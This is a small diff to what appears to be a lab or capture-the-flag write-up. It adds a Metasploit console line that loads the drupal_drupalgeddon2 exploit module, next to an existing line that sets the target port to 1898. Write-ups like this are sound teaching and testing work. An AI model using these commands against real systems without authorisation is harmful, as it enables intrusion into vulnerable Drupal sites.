@@ -198,6 +198,10 @@ We can find the exploit on the Metasploit framework.
 ### Using exploit module from Metasploit framework
 
 ```
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
+```
+
+```
 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 1898
 ```
 
